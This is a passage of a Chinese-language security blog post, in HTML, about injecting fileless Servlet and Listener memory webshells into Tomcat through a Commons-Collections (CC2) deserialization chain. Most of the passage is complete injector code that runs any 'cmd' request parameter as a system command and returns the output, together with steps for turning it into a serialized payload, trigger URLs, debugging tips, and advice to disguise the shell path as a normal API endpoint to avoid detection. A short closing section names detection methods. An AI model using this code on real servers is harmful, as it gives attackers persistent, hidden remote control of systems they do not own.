   wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">            wrapper.setServlet(servlet);</span><br><span class="line"></span><br><span class="line">            ctx.addChild(wrapper);</span><br><span class="line">            ctx.addServletMappingDecoded(<span class="string">&quot;/api/test&quot;</span>, <span class="string">&quot;evilServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Servlet 注入成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = cl.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resourcesField = clazz.getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resourcesField == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(cl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> resources.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> contextField.get(resources);</span><br><span class="line">        <span class="keyword">if</span> (context <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">            <span class="keyword">return</span> (StandardContext) context;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator it, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>GetBytes</code> 工具类这次需要同时提取主类和匿名内部类两个字节数组：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetBytes</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct1</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.demo.MInjectServlet&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] injectBytes = ct1.toBytecode();</span><br><span class="line">        System.out.println(<span class="string">&quot;MInjectServlet: &quot;</span> + Arrays.toString(injectBytes));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 匿名内部类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct2</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.demo.MInjectServlet$1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] innerBytes = ct2.toBytecode();</span><br><span class="line">        System.out.println(<span class="string">&quot;MInjectServlet$1: &quot;</span> + Arrays.toString(innerBytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>CC2 链里 <code>_bytecodes</code> 改成两个一起传：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] injectBytes = &#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="comment">/* MInjectServlet 字节数组 */</span>&#125;;</span><br><span class="line"><span class="type">byte</span>[] innerBytes  = &#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="comment">/* MInjectServlet$1 字节数组 */</span>&#125;;</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;innerBytes, injectBytes&#125;);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Servlet 内存马的路径选择上建议模仿正常接口命名，比如 <code>/api/status</code>、<code>/actuator/info</code> 这类，降低被发现的可能性。</p>
+</blockquote>
+<p>先运行 <code>MInjectServlet</code> 生成两个 class 文件，再利用 <code>GetBytes</code> 输出字节数组，放入 CC2 链中，再次运行获得整个序列化的 Base64 数据。提交后访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/api/test?cmd=calc</span><br></pre></td></tr></table></figure>
+
+<p>成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421183807857.png"></p>
+<hr>
+<h2 id="Listener-内存马注入实现"><a href="#Listener-内存马注入实现" class="headerlink" title="Listener 内存马注入实现"></a>Listener 内存马注入实现</h2><p>Listener（监听器）是三种里最隐蔽的——它不出现在 FilterChain 里，也没有 URL 映射，纯粹靠事件驱动。</p>
+<p>Listener 拿 response 有一点麻烦，因为 <code>ServletRequestEvent</code> 里只能直接拿到 <code>ServletRequest</code>，response 需要两层反射来挖：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MInjectListener</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MInjectListener</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> getStandardContext();</span><br><span class="line">            <span class="keyword">if</span> (ctx == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">			<span class="comment">//listener的匿名内部类(下面的部分和之前写的jsp代码完全一样)</span></span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">maliciousListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 获取 HttpServletRequest</span></span><br><span class="line">                        javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span></span><br><span class="line">                                (javax.servlet.http.HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                            <span class="comment">// 执行命令，获得输出流</span></span><br><span class="line">                            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                            java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream())</span><br><span class="line">                            );</span><br><span class="line">                            String line;</span><br><span class="line">                            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                                output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> output.toString();</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// ========== 关键：反射获取 Response（两层反射，修复 ClassCastException）==========</span></span><br><span class="line">                            <span class="comment">// 步骤1：从 ServletRequestEvent 中获取 request 字段（实际类型是 RequestFacade）</span></span><br><span class="line">                            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> sre.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">requestFacade</span> <span class="operator">=</span> requestField.get(sre);  <span class="comment">// 这是 org.apache.catalina.connector.RequestFacade</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 步骤2：从 RequestFacade 中获取真正的 Request 对象（字段名也是 &quot;request&quot;）</span></span><br><span class="line">                            <span class="type">Field</span> <span class="variable">innerRequestField</span> <span class="operator">=</span> requestFacade.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                            innerRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">catalinaRequest</span> <span class="operator">=</span></span><br><span class="line">                                    (org.apache.catalina.connector.Request) innerRequestField.get(requestFacade);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 步骤3：从 Request 中获取 Response</span></span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">catalinaResponse</span> <span class="operator">=</span> catalinaRequest.getResponse();</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 步骤4：写入响应</span></span><br><span class="line">                            catalinaResponse.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">                            catalinaResponse.getWriter().write(<span class="string">&quot;Command: &quot;</span> + cmd + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                            catalinaResponse.getWriter().write(<span class="string">&quot;Output:\n&quot;</span> + result);</span><br><span class="line">                            catalinaResponse.flushBuffer();</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//这个是新加的代码因为发现之前写的jsp的那个代码有点问题,必须需要访问存在的页面才能回显,访问任意路径可以执行clac这些命令但是不能正常回显,页面卡死的状态</span></span><br><span class="line">                            <span class="comment">// 为了防止 Tomcat 后续处理（如错误页面）覆盖已经写入的响应，</span></span><br><span class="line">                            <span class="comment">// 用反射调用 finishResponse() 提前结束当前请求的处理</span></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="comment">//通过反射获取 org.apache.catalina.connector.Response 类中声明的 finishResponse() 方法</span></span><br><span class="line">                                java.lang.reflect.<span class="type">Method</span> <span class="variable">finish</span> <span class="operator">=</span> catalinaResponse.getClass()</span><br><span class="line">                                        .getDeclaredMethod(<span class="string">&quot;finishResponse&quot;</span>);</span><br><span class="line">                                finish.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                <span class="comment">//执行 catalinaResponse.finishResponse()</span></span><br><span class="line">                                <span class="comment">// 调用后 Tomcat 认为该请求已处理结束，</span></span><br><span class="line">                                <span class="comment">// 不会再执行 Valve、Filter、Servlet 或错误页面等后续步骤</span></span><br><span class="line">                                finish.invoke(catalinaResponse);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Listener 注册比 Filter 和 Servlet 简单很多，一行搞定</span></span><br><span class="line">            ctx.addApplicationEventListener(maliciousListener);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Listener 注入成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 StandardContext 的方法依然没变</span></span><br><span class="line">    <span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = cl.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resourcesField = clazz.getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resourcesField == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(cl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> resources.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> contextField.get(resources);</span><br><span class="line">        <span class="keyword">if</span> (context <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">            <span class="keyword">return</span> (StandardContext) context;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator it, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入成功后，任意路径带 <code>cmd</code> 参数即可触发，和 Filter 马效果一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/任意路径/?cmd=calc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421201728530.png"></p>
+<hr>
+<h2 id="常见问题踩坑"><a href="#常见问题踩坑" class="headerlink" title="常见问题踩坑"></a>常见问题踩坑</h2><p><strong>1. <code>ClassCastException: cannot cast to ParallelWebappClassLoader</code></strong></p>
+<p>不同版本 Tomcat 的类加载器类名不一样，有时候是 <code>WebappClassLoader</code>，有时候是 <code>ParallelWebappClassLoader</code>。建议不要写死强转，改用 <code>instanceof</code> 判断，或者按父类 <code>WebappClassLoaderBase</code> 来操作，兼容性会好很多。</p>
+<p><strong>2. <code>NoSuchFieldException: resources</code></strong></p>
+<p><code>resources</code> 字段可能在父类里，<code>getStandardContext()</code> 里用循环 <code>getSuperclass()</code> 向上找就能解决，本文代码里已经处理了这个问题。</p>
+<p><strong>3. Filter 注入成功但命令无回显</strong></p>
+<p>大概率是 <code>filterStart()</code> 没调或者调用时机不对。确认顺序是 <code>addFilterDef → addFilterMap → filterStart()</code>，缺一不可。</p>
+<p><strong>4. Listener 里拿不到 response</strong></p>
+<p>反射路径是 <code>RequestFacade → Request → Response</code>，Tomcat 不同版本字段名可能略有差异。建议先在本地 debug，用 IDE 的变量观察窗口确认字段结构再写代码，别靠猜。</p>
+<p><strong>5. CC 链触发后服务器报 <code>ClassCastException</code></strong></p>
+<p><code>TemplatesImpl</code> 加载的类必须继承 <code>AbstractTranslet</code>，否则 <code>newTransformer()</code> 调用会抛异常，后续构造函数根本不会执行。确认注入器类 <code>extends AbstractTranslet</code>，且两个抽象方法都实现了。</p>
+<p><strong>6. Listener 访问任意路径能弹 calc 但页面卡死</strong></p>
+<p>这是没有调用 <code>finishResponse()</code> 导致的，Tomcat 在执行完 Listener 后还会继续走后续的 Valve 和错误页面处理，新的响应内容把我们写的东西覆盖了，或者响应流没有正确关闭。加上反射调用 <code>catalinaResponse.finishResponse()</code> 就能解决。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个流程的精妙在于各个环节的无缝衔接：</p>
+<ul>
+<li><strong>CC 链</strong>负责把序列化数据转化为代码执行的触发</li>
+<li><strong>TemplatesImpl</strong> 充当字节码加载器，还原恶意类并触发构造函数</li>
+<li><strong>构造函数</strong>里的反射链负责从线程上下文一路挖到 <code>StandardContext</code></li>
+<li><strong>defineClass</strong> 绕过类路径限制，把恶意组件直接注入 JVM</li>
+<li><strong>FilterDef &#x2F; Wrapper &#x2F; EventListener</strong> 通过 Tomcat 的标准 API 完成运行时注册</li>
+</ul>
+<p>整个过程没有文件写入磁盘，所有操作都在内存里完成。服务重启后内存马消失，但在运行期间，通过一个普通的 GET 参数就能持续控制服务器。</p>
+<p>三种内存马类型对比：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>触发方式</th>
+<th>路径要求</th>
+<th>隐蔽性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Filter</td>
+<td><code>/*</code> 任意路径 + <code>cmd</code> 参数</td>
+<td>无限制</td>
+<td>高</td>
+</tr>
+<tr>
+<td>Servlet</td>
+<td>固定路径 + <code>cmd</code> 参数</td>
+<td>需访问特定路径</td>
+<td>中</td>
+</tr>
+<tr>
+<td>Listener</td>
+<td>任意路径 + <code>cmd</code> 参数</td>
+<td>无限制</td>
+<td>最高</td>
+</tr>
+</tbody></table>
+<p>从防御角度来说，内存马不落磁盘，传统文件扫描完全失效。主要的检测手段包括：JVM Instrumentation（如 <code>java-memshell-scanner</code> 这类工具）、异常类加载行为监控，以及对动态注册 Filter &#x2F; Servlet 行为的检测。了解攻击手法的目的，也是为了更好地理解防御该从哪里入手。</p>
+<p>写在最后：刚接触这块的时候觉得利用链 + 内存马 + 反射一起上会很复杂，但真正拆开来一步步实现，发现每个模块其实都是独立的、可以单独验证的。把它们连起来之后，整个流程反而清晰了很多——共勉。</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%85%E5%AD%98%E9%A9%AC-%E2%80%94%E2%80%94-CC2-Tomcat%E4%B8%89%E7%A7%8D%E7%BB%84%E4%BB%B6-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-text">原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-text">无文件攻击与内存马的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E8%B7%AF"><span class="toc-text">注入的核心思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">搭建存在漏洞的服务端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 文件上传型漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-POST-%E5%8F%82%E6%95%B0%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. POST 参数型漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2"><span class="toc-text">前端页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E5%85%A5%E5%8F%A3%E6%98%AF%E5%90%A6%E6%AD%A3%E5%B8%B8"><span class="toc-text">验证漏洞入口是否正常</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E6%8B%86%E8%A7%A3"><span class="toc-text">注入流程拆解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E9%80%89%E6%8B%A9%E9%80%BB%E8%BE%91"><span class="toc-text">利用链的选择逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%89%A7%E8%A1%8C%E9%93%BE%E8%B7%AF"><span class="toc-text">整体执行链路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 